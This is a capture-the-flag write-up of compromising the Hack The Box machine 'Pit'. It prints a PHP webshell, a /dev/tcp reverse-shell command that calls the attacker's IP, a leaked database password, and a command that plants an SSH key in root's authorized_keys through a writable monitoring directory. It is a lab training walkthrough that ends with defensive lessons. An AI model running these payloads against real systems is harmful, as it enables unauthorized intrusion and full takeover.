# HTB: Pit

**Target IP:** 10.129.228.106
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### 1.1 TCP Scan

```
┌──(root㉿kali)-[/home/kali/pit]
└─# nmap -sCV -T4 10.129.228.106
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-03 22:37 +0000
Nmap scan report for 10.129.228.106
Host is up (0.31s latency).
Not shown: 969 filtered tcp ports (no-response), 28 filtered tcp ports (admin-prohibited)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http    nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  http    Cockpit web service 221 - 253
|_http-title: Did not follow redirect to https://10.129.228.106:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 80 only serves the **default nginx test page** — nothing usable there.
- Port 9090 redirects to HTTPS and is running **Cockpit** (a Linux web-based server admin console).
- Browsing to `https://10.129.228.106:9090/` reveals the domain **`pit.htb`**.
- Checking the TLS certificate's **Subject Alternative Name** reveals a second vhost: **`dms-pit.htb`**.

Both hostnames were added to `/etc/hosts`.

### 1.2 UDP Scan

```
┌──(root㉿kali)-[/home/kali/pit]
└─# nmap -sU -top-ports 100 10.129.228.106
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-04 08:58 +0000
Nmap scan report for 10.129.228.106
Host is up (0.31s latency).
Not shown: 99 filtered udp ports (admin-prohibited)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 100.03 seconds
```

**SNMP is open** and — as tested below — is running with the default public community string. This turns out to be critical for both recon *and* the eventual root exploit.

---

## 2. Web Enumeration

### 2.1 Directory Brute-Force on Cockpit (9090)

```
┌──(root㉿kali)-[/home/kali/pit]
└─# feroxbuster -u https://10.129.228.106:9090/ -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://10.129.228.106:9090/
 🚩  In-Scope Url          │ 10.129.228.106
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
200      GET      776l     3123w    43548c Auto-filtering found 404-like response and created new filter
200      GET        1l        4w       24c https://10.129.228.106:9090/ping
200      GET      652l     2560w    32039c https://10.129.228.106:9090/654
200      GET       34l       36w     2118c https://10.129.228.106:9090/ca.cer
403      GET       50l      101w     3458c https://10.129.228.106:9090/cockpit/static/
403      GET       50l      101w     3458c https://10.129.228.106:9090/cockpit/static/fonts
400      GET        2l        7w      107c https://10.129.228.106:9090/socket
200      GET       26l       44w      447c https://10.129.228.106:9090/cockpit/static/branding.css
.....
<snip — dozens more 200/403/404 hits, mostly Cockpit static assets and noise from the wordlist, nothing else of note>
.....
404      GET        4l        6w       50c https://10.129.228.106:9090/cockpit/static/tron
```

Nothing beyond the expected Cockpit static assets / API endpoints — no useful hidden path here. Attention shifted to the second vhost found in the cert (`dms-pit.htb`).

### 2.2 SeedDMS discovery

Browsing revealed a **`/seeddms51x/seeddms`** directory. Accessing `http://dms-pit.htb/seeddms51x/seeddms` redirects to a login page for **SeedDMS**.

Credentials `michelle:michelle` worked.

---

## 3. SNMP Enumeration

With the community string `public` confirmed, `snmpwalk` was used to enumerate host details, running processes and — most importantly — the **NET-SNMP-EXTEND-MIB**.

### 3.1 Disk / process info

```
┌──(root㉿kali)-[/home/kali/pit]
└─# snmpwalk -cpublic -v2c 10.129.228.106 .1.3.6.1.4.1.2021.9
iso.3.6.1.4.1.2021.9.1.1.1 = INTEGER: 1
iso.3.6.1.4.1.2021.9.1.1.2 = INTEGER: 2
iso.3.6.1.4.1.2021.9.1.2.1 = STRING: "/"
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"
iso.3.6.1.4.1.2021.9.1.3.1 = STRING: "/dev/mapper/cl-root"
iso.3.6.1.4.1.2021.9.1.3.2 = STRING: "/dev/mapper/cl-seeddms"
.....
<snip — remainder is standard UCD-SNMP-MIB disk usage counters (blocks used/free/available, thresholds), not of direct use>
```

This confirmed SeedDMS lives at `/var/www/html/seeddms51x/seeddms` and disclosed the user **michelle** along with running processes `free` and `monitor`.

### 3.2 NET-SNMP-EXTEND-MIB — the interesting bit

```
┌──(root㉿kali)-[/home/kali/pit]
└─# snmpwalk -cpublic -v2c 10.129.228.106 .1.3.6.1.4.1.8072.1.3.2
iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 2
iso.3.6.1.4.1.8072.1.3.2.2.1.2.6.109.101.109.111.114.121 = STRING: "/usr/bin/free"
iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
.....
iso.3.6.1.4.1.8072.1.3.2.3.1.2.6.109.101.109.111.114.121 = STRING: "              total        used        free      shared  buff/cache   available
Mem:        4023492      304352     3447740        8772      271400     3488972
Swap:       1961980           0     1961980"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
.....
<snip — full SELinux user/role table and login mapping table, repeated verbatim on later re-runs of the box (michelle mapped to user_u, root mapped to unconfined_u), and a "System uptime" line>
```

Two `NET-SNMP-EXTEND-MIB` "exec" entries stood out:

```
NET-SNMP-EXTEND-MIB::nsExtendCommand."memory"     = STRING: /usr/bin/free
NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
```

This is `snmpd` configured with `extend` directives that let SNMP trigger execution of arbitrary local scripts under `/usr/bin/free` and `/usr/bin/monitor` — this became the privilege-escalation vector later on.

---

## 4. Initial Foothold — SeedDMS RCE (CVE-2019-12744)

### 4.1 Version disclosure

Logged in to SeedDMS as `michelle:michelle`, the changelog was pulled down:

```
┌──(root㉿kali)-[/home/kali/pit]
└─# cat /home/kali/Downloads/CHANGELOG
--------------------------------------------------------------------------------
                     Changes in version 5.1.15
--------------------------------------------------------------------------------
- Improved import from file system
- HTTP Proxy for access on external extension repository can be set
- Do not use unzip in ExtensionMgr anymore
- fix version compare on info page
- allow one page mode on search page
- fix import of older extension versions from repository
.....
<snip — 5.1.14 changelog entries, unrelated to the vuln>
```

SeedDMS **5.1.15** is vulnerable to **CVE-2019-12744** — an authenticated arbitrary file upload leading to remote code execution (exploit reference: [exploit-db.com/exploits/47022](https://www.exploit-db.com/exploits/47022)).

### 4.2 Building the payload

```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

The PHP webshell was uploaded through michelle's SeedDMS account. Hovering over the newly uploaded document revealed its **documentID**:

```
http://dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=29&showtree=1
```

### 4.3 Confirming RCE

```
┌──(root㉿kali)-[/home/kali/pit]
└─# curl 'http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=id'
<pre>uid=992(nginx) gid=988(nginx) groups=988(nginx) context=system_u:system_r:httpd_t:s0
</pre>
```

Command execution confirmed as the `nginx` service account.

### 4.4 Getting a shell

```
┌──(root㉿kali)-[/home/kali/pit]
└─# curl 'http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.146%2F4444%200%3E%261'

┌──(root㉿kali)-[/home/kali/pit]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.106] 34492
sh: cannot set terminal process group (2940): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4$
```

A reverse shell as `nginx` was caught on port 4444.

---

## 5. Lateral Movement — nginx → michelle

From the reverse shell, the SeedDMS configuration file was read to pull database credentials:

```
sh-4.4$ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <site>
.....
<snip — verbose inline documentation comments for every config option (display, edition, calendar sections)>
.....
    <server rootDir="/home/www-data/seeddms51x/www/" httpRoot="/seeddms51x/" contentDir="/home/www-data/seeddms51x/data/" stagingDir="/home/www-data/seeddms51x/data/staging/" luceneDir="/home/www-data/seeddms51x/data/lucene/" logFileEnable="true" logFileRotation="d" enableLargeFileUpload="false" partitionSize="2000000" cacheDir="/home/www-data/seeddms51x/data/cache/" dropFolderDir="" backupDir="/home/www-data/seeddms51x/data/backup/">
    </server>
.....
<snip — LDAP / Active Directory connector stanzas, both disabled>
.....
    <database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
    </database>
    <smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/>
  </system>
.....
```

**Credential found:** `seeddms` / `ied^ieY6xoquu`

This DB password did **not** work over SSH, but **did** work for the **`michelle`** account on the **Cockpit login page** (`https://10.129.228.106:9090/`) — password reuse across services.

### 5.1 Shell via Cockpit terminal

Logged into Cockpit as `michelle`, used the built-in web terminal (`https://10.129.228.106:9090/system/terminal`) to fire another reverse shell:

```
┌──(root㉿kali)-[/home/kali/pit]
└─# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.228.106] 39430
sh-4.4$ whoami
whoami
michelle
sh-4.4$
[michelle@pit /]$
```

Legitimate shell access as `michelle` obtained.

---

## 6. Privilege Escalation — michelle → root

### 6.1 Standard SUID checks (dead end)

```
[michelle@pit /]$ find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null
-rwsr-x---. 1 root dbus 63760 Apr  7  2021 /usr/libexec/dbus-1/dbus-daemon-launch-helper
-rwsr-xr-x. 1 root root 29640 Apr  9  2020 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-x. 1 root root 12016 Mar  2  2021 /usr/sbin/grub2-set-bootflag
-rwsr-xr-x. 1 root root 12320 Jun 15  2020 /usr/sbin/pam_timestamp_check
-rwsr-xr-x. 1 root root 37864 Jun 15  2020 /usr/sbin/unix_chkpwd
-rwsr-xr-x. 1 root root 84296 Aug 12  2020 /usr/bin/gpasswd
-rwsr-xr-x. 1 root root 43560 Aug 12  2020 /usr/bin/newgrp
-rwsr-xr-x. 1 root root 50456 Jul 21  2020 /usr/bin/mount
-rwsr-xr-x. 1 root root 50320 Jul 21  2020 /usr/bin/su
-rwsr-xr-x. 1 root root 33648 Jul 21  2020 /usr/bin/umount
-rwsr-xr-x. 1 root root 35624 Apr  9  2020 /usr/bin/pkexec
-rwsr-xr-x. 1 root root 65904 Nov  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 38680 May 11  2019 /usr/bin/fusermount
-rwsr-xr-x. 1 root root 79648 Aug 12  2020 /usr/bin/chage
---s--x--x. 1 root root 165632 Jan 26  2021 /usr/bin/sudo
-rwsr-xr-x. 1 root root 33600 Apr  6  2020 /usr/bin/passwd
```

Nothing interesting — all standard binaries.

### 6.2 Back to SNMP — NET-SNMP-EXTEND-MIB abuse

Recalling the earlier SNMP enumeration: the box has **full SNMP process-list read access**, and `nsExtendCommand."monitoring"` pointed to `/usr/bin/monitor`.

```
[michelle@pit tmp]$ find / -name "monitor" 2>/dev/null
/usr/share/snmp/snmpconf-data/snmpd-data/monitor
/usr/bin/monitor
[michelle@pit tmp]$ cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
[michelle@pit tmp]$ /usr/bin/monitor
bash: /usr/bin/monitor: Permission denied
[michelle@pit tmp]$ ls -la /usr/local/monitoring
ls: cannot open directory '/usr/local/monitoring': Permission denied
[michelle@pit tmp]$ ls -ld /usr/local/monitoring
drwxrwx---+ 2 root root 121 Aug  4 07:56 /usr/local/monitoring
[michelle@pit tmp]$ getfacl /usr/local/monitoring
getfacl: Removing leading '/' from absolute path names
# file: usr/local/monitoring
# owner: root
# group: root
user::rwx
user:michelle:-wx
group::rwx
mask::rwx
other::---
```

**Key finding:** `/usr/local/monitoring` is `root:root`, but a **facl (extended ACL) entry grants `michelle` write-only (`-wx`) access**. `michelle` can't `ls` the directory or read it, but she *can write new files into it* — and `/usr/bin/monitor` (run as `root`, presumably via a cron job or the SNMP `extend` script itself) executes every `check*sh` script in that directory.

### 6.3 Exploiting the write-only ACL

A malicious script was dropped that appends the attacker's SSH public key to `root`'s `authorized_keys`:

```
[michelle@pit monitoring]$ echo 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEHHf6qpHvZfU4zviqe6b4cjQvqmchDG2d7AjK3tFS9a root@kali" >> /root/.ssh/authorized_keys' > /usr/local/monitoring/check_key.sh
```

Since `michelle` cannot read the directory, she cannot confirm the file landed correctly — but write access was enough to place it in the path `monitor` iterates over.

### 6.4 Triggering execution via SNMP

The script had to wait for `/usr/bin/monitor` to run as root. Polling `nsExtendCommand."monitoring"` over SNMP forces (or at least corresponds to) execution of `/usr/bin/monitor`:

```
┌──(root㉿kali)-[/home/kali/pit]
└─# snmpwalk -cpublic -v2c 10.129.228.106 .1.3.6.1.4.1.8072.1.3.2
iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 2
.....
<snip — same free/memory + database status + SELinux/login table output as before>
.....
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = STRING: " 08:23:56 up  1:21,  1 user,  load average: 0.11, 0.10, 0.05"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.10.109.111.110.105.116.111.114.105.110.103.27 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

*(No output field directly confirms the key was written — the `monitoring` extend output only ever reports the built-in "Database status" / SELinux / uptime info, not the custom script's result. The proof came from the SSH login succeeding immediately after.)*

### 6.5 Root via SSH key

```
┌──(root㉿kali)-[/home/kali/pit]
└─# ssh -i ~/.ssh/htb_root root@10.129.228.106
The authenticity of host '10.129.228.106 (10.129.228.106)' can't be established.
ED25519 key fingerprint is: SHA256:bgCXot0BwaVATwtq8Bz9TNg2qB3Y2JhOGILd/uGA5A8
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:99: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.106' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Web console: https://pit.htb:9090/ or https://10.129.228.106:9090/

Last login: Fri Nov  4 06:27:14 2022
[root@pit ~]# pwd
/root
[root@pit ~]# ls
cleanup.sh  monitoring  null  root.txt
[root@pit ~]# cat root.txt
```

SSH login as `root` succeeded — the injected key had landed in `/root/.ssh/authorized_keys` via the ACL/SNMP-triggered `monitor` script, confirming full root compromise of the box.

---

## 7. Summary

| Stage | Vector |
|---|---|
| Recon | nmap TCP + UDP, cert SAN revealed `dms-pit.htb`, SNMP `public` community string open |
| Initial access | SeedDMS 5.1.15 authenticated arbitrary file upload → RCE (**CVE-2019-12744**) as `nginx` |
| Lateral movement | Hardcoded DB credentials in `settings.xml`, reused as `michelle`'s Cockpit password |
| Privilege escalation | Writable-only POSIX ACL on `/usr/local/monitoring` (owned by root) + `NET-SNMP-EXTEND-MIB` `monitor` script run as root → planted SSH key for `root` |
| Impact | Full root shell / SSH access |

### Key takeaways
- Default SNMP community strings (`public`) leak sensitive host/process/config info and, when combined with `extend` scripts, can become a full privilege-escalation primitive.
- POSIX ACLs can silently override the "obvious" permission bits shown by `ls -l` — always run `getfacl` on directories that look root-only but behave oddly.
- Config files (`settings.xml`) with plaintext DB credentials are a classic pivot point when service accounts reuse passwords across applications (SeedDMS DB password → Cockpit login).
- Keeping software up to date matters: CVE-2019-12744 in SeedDMS 5.1.15 was the entire initial foothold.
